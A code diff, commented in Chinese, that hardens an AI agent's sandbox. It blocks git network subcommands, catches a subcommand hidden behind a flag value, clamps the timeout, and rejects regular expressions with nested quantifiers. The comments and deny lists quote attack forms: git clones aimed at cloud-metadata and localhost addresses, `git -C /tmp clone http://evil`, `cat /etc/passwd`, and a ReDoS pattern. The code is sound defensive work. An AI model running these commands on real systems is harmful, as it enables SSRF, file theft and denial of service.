@@ -35,6 +35,7 @@ import {
   realpathOrResolve,
 } from '../utils/workspace-roots.js'
 import { promisify } from 'node:util'
+import { hasNestedQuantifier } from './rules-service.js'
 
 const execAsync = promisify(exec)
 
@@ -551,6 +552,60 @@ export const agentLoop = new AgentLoopRuntime()
 
 export type SandboxMode = 'read-only' | 'workspace-write' | 'danger-full-access'
 
+/**
+ * 2026-11-01 安全强化:git 在二进制白名单里,却**既不在 NETWORK_COMMANDS 也不在文件工具集**
+ * ⇒ 受限沙箱内 `git clone http://169.254.169.254/…`、`git ls-remote http://127.0.0.1:8830/admin`
+ * 既绕过整套 ssrf-guard(子进程自己发 DNS/TCP,守卫管不到),又把远端可控内容写到未检的参数路径。
+ * 这张表列的是"会主动出网/会写整目录"的 git 子命令;受限模式一律拒(danger-full-access 除外,
+ * 那一档的语义就是运维显式放开的完全访问)。
+ */
+const GIT_NETWORK_SUBCOMMANDS = new Set<string>([
+  'clone',
+  'fetch',
+  'pull',
+  'push',
+  'ls-remote',
+  'remote',
+  'submodule',
+  'archive',
+  'http-fetch',
+  'http-push',
+  'request-pull',
+  'credential',
+])
+
+/**
+ * 受限沙箱内 git 的"会出网"判据 —— **逐 token 判,不解析子命令位置**。
+ *
+ * 为什么不按"子命令位置"解析:git 的全局选项把值当**独立 token** 收
+ * (`git -C /tmp clone http://evil`),按"首个非旗标操作数"取会把 `/tmp` 当成子命令,
+ * 于是网络子命令被藏在旗标值后面绕过闸(这条是本轮用例实测出来的,不是设想)。
+ * 所以正解是失败方向收敛的那一侧:任一 token **逐字等于**网络子命令、或任一 token 带
+ * `scheme://` 形态的远端地址 ⇒ 拒。宁可多拦(合法的 `git log clone-notes.md` 这类
+ * 路径不会命中,因为要求整 token 相等),也绝不放过藏在旗标后面的形态。
+ */
+export function findGitEgressToken(tokens: string[]): string | null {
+  for (const t of tokens.slice(1)) {
+    if (!t) continue
+    const bare = t.includes('=') ? t.slice(t.indexOf('=') + 1) : t
+    if (GIT_NETWORK_SUBCOMMANDS.has(bare.toLowerCase())) return bare
+    if (/[a-z][a-z0-9+.-]*:\/\//i.test(t)) return t
+  }
+  return null
+}
+
+/**
+ * 沙箱执行超时归一(2026-11-01 安全强化)。
+ * `timeoutMs` 是客户端自报的 `z.number()`(路由层无上下界):NaN/负数原样传进 execFile
+ * 等价"永不超时"的挂死面,超大值则让一枚请求长期占住子进程槽。取不到合法数 ⇒ 用默认档,
+ * 不猜"调用者想要多长"。
+ */
+export function clampSandboxTimeout(raw: unknown, fallbackMs = 60000): number {
+  const n = Number(raw)
+  if (!Number.isFinite(n)) return fallbackMs
+  return Math.min(Math.max(Math.trunc(n), 1000), 120000)
+}
+
 const NETWORK_COMMANDS = [
   'curl',
   'wget',
@@ -641,6 +696,8 @@ const SANDBOX_FILE_TOOL_BINARIES = new Set<string>([
   'unzip',
   'gzip',
   'gunzip',
+  // 2026-11-01 安全强化:git 的操作数(clone 目标目录、--work-tree=、-C 等)同样是写面
+  'git',
 ])
 
 const SANDBOX_BINARY_WHITELIST = new Set<string>([
@@ -848,6 +905,19 @@ class SandboxExecutor {
         mode,
       }
     }
+    // 2026-11-01 安全强化:git 的网络型子命令在受限档拒绝(见 GIT_NETWORK_SUBCOMMANDS 头注)。
+    // 判据顺序刻意排在"解释器仅 admin"之后、路径逐参数检查之前:先定"能不能出网",再定"写到哪"。
+    if (binary === 'git' && this.isNetworkRestricted(mode)) {
+      const offender = findGitEgressToken(tokens)
+      if (offender) {
+        return {
+          stdout: '',
+          stderr: `受限沙箱内禁止 git 的外连形态(${offender.slice(0, 60)}):该子命令会自行发起外连(ssrf-guard 覆盖不到子进程),远端内容还会写到参数路径`,
+          exitCode: 126,
+          mode,
+        }
+      }
+    }
     // 2026-10-31 R8 复评 F1:文件操作类的路径参数必须落在登记根内(此前闸只判
     // cwd,`cat /etc/passwd`、`tee /任意路径` 等参数路径原样通过)。逐参数
     // realpathOrResolve + isInsideRoot,与 FSBridge.resolvePath 同判据。
@@ -896,7 +966,7 @@ class SandboxExecutor {
     }
 
     const env = this.cleanEnv()
-    const timeout = params.timeoutMs ?? 60000
+    const timeout = clampSandboxTimeout(params.timeoutMs)
 
     try {
       // 用 execFile 替代 exec,绕过 shell 直接传递参数,无 shell 注入风险
@@ -3026,6 +3096,12 @@ class FSBridge {
     // ReDoS 运行闸(2026-10-31 安全强化第 11 批):主线程同步正则,超长 pattern 直接拒绝
     if (params.pattern.length > FSBridge.MAX_GREP_PATTERN_LENGTH) {
       throw new Error(`pattern 超过 ${FSBridge.MAX_GREP_PATTERN_LENGTH} 字符上限`)
+    }
+    // 2026-11-01 安全强化:长度上限拦不住 `(a+)+$` 这类**短而病态**的模式 —— 一枚几十字符的
+    // 嵌套量词就能把主线程钉住几十秒(整个 API 停摆)。本仓已有同一判据(rules-service 的
+    // hasNestedQuantifier,已接进规则编辑面),这里复用它而不是另造一份(§0.6)。
+    if (hasNestedQuantifier(params.pattern)) {
+      throw new Error('pattern 含嵌套量词(如 (a+)+),存在指数级回溯风险,已拒绝')
     }
     const root = this.resolvePath(params.path, params.workspacePath)
     const regex = new RegExp(params.pattern, 'i')
